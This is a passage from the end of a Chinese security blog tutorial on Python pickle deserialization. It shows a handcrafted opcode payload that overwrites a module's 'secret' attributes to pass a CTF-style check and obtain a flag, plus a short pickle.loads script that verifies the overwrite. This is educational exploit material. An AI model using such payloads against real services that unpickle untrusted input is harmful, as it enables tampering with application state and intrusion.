<li>再正常序列化一个<code>Animal</code>类的对象<code>data</code>，其中<code>data.name</code>设置为<code>233</code>，这样就可以使<code>if</code>条件成立，拿到flag。</li></ol> <p>明白基本流程之后，我们开始着手构造opcode：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token string">b'c__main__\nsecret\n}(Vname\nV233\nub0c__main__\nAnimal\n)\x81}(Vname\nV233\nub.'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>我们可以用<code>pickletools.dis()</code>来反汇编opcode：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200920145112.png" alt="image-20200920145112680"></p> <p>base64编码之后传入opcode，结果如下：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200913140304.png" alt="image-20200913140304166"></p> <p>我们可以编写下面这段简单的代码来验证变量覆盖的结果：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> secret

data <span class="token operator">=</span> <span class="token string">b'c__main__\nsecret\n}(Vname\nV233\nub0c__main__\nAnimal\n)\x81}(Vname\nV233\nub.'</span>
obj <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>secret<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200913140547.png" alt="image-20200913140547724"></p> <h2 id="结语"><a href="#结语" class="header-anchor">#</a> 结语</h2> <p>到现在为止，相信各位已经可以理解为什么有人说<strong>pickle是一种语言</strong>，对于pickle来说，<strong>它对于opcode的解析能力是远大于生成能力的。</strong></p> <p>感谢观看本文，如有错误，请各位师傅不吝赐教。</p> <h2 id="参考文章"><a href="#参考文章" class="header-anchor">#</a> 参考文章</h2> <p><a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=pickle#module-pickle" target="_blank" rel="noopener noreferrer">python官方文档<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><a href="https://xz.aliyun.com/t/7436#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" target="_blank" rel="noopener noreferrer">先知社区：pickle反序列化初探<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener noreferrer">知乎：从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p></div></div> <div class="page-edit"><!----> <!----> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/715643/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">PHP新特性绕过disable_functions</div></a> <a href="/pages/776e20/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">Java反射特性摘要</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/715643/" class="prev">PHP新特性绕过disable_functions</a></span> <span class="next"><a href="/pages/776e20/">Java反射特性摘要</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/152581/"><div>RMI与JNDI（一）</div></a> <span>01-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/fae557/"><div>Java8-Stream</div></a> <span>01-03</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/5d070a/"><div>谈一谈Java动态加载字节码的方式</div></a> <span>12-18</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div> </main></div> <div class="footer"><div class="icons"></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2021
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.23243609.js" defer></script><script src="/assets/js/2.b6b5fde6.js" defer></script><script src="/assets/js/13.e7eb76d3.js" defer></script>
  </body>
</html>